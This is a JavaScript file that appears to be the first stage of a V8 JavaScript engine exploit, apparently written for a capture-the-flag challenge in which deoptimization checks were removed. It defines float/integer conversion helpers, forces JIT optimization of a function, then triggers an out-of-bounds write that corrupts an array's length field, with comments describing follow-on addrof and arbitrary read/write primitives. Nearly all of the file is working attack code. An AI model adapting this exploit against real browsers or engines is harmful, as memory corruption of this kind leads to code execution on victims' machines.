const NUM_LOOPS_FOR_OPTIM = 100000; // Change this if it is not optimizing

// conversion between floats, integers, and SMIs
// stolen from here: https://www.jaybosamiya.com/blog/2019/01/02/krautflare/
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
	return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
	int_view[0] = this;
	return float_view[0];
}
BigInt.prototype.smi2f = function() {
	int_view[0] = this << 32n;
	return float_view[0];
}
Number.prototype.f2i = function() {
	float_view[0] = this;
	return int_view[0];
}
Number.prototype.f2smi = function() {
	float_view[0] = this;
	return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
	return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
	return BigInt(this).smi2f();
}

// function that accesses an array based on parameter
// we will first make v8 optimize the function, then access it with
// an invalid index. Since the deoptimization code has been removed, this
// will lead to an OOB access.
//
// c will contain unpacked values and will be used for the addrof primitive
// d will contain packed values and will be used for arbitrary read/write
function foobar(idx) {
	let a = [0.1, 0.1, 0.1, 0.1, 0.1, 0.1];
	let b = [1.1, 1.2, 1.3, 1.4, 1.5];
	let c = [{}, 2.2, 2.3, 2.4, 2.5, 2.6, 2.7, 2.8];
	let d = [3.1, 3.2, 3.3, 3.4];

	a[idx * 16] = (1024*1024).smi2f();

	oob_buffer = b;
	oob_buffer_unpacked = c;
	oob_buffer_packed = d;
}

// optimize function
for (var i = 0; i < NUM_LOOPS_FOR_OPTIM ; i++) {
	foobar(0);
}

// trigger function with oob value :))
// deoptimization isn't triggered, thus we end up setting a[16] to (1024 * 1024)
// this offset happens to be oob_buffer's length field
foobar(1);

console.log("[+] oob_buffer.length: " + oob_buffer.length);
if (oob_buffer.length != (1024 * 1024)) {
	throw "[-] failed to corrupt ArrayBuffer lenght";
}
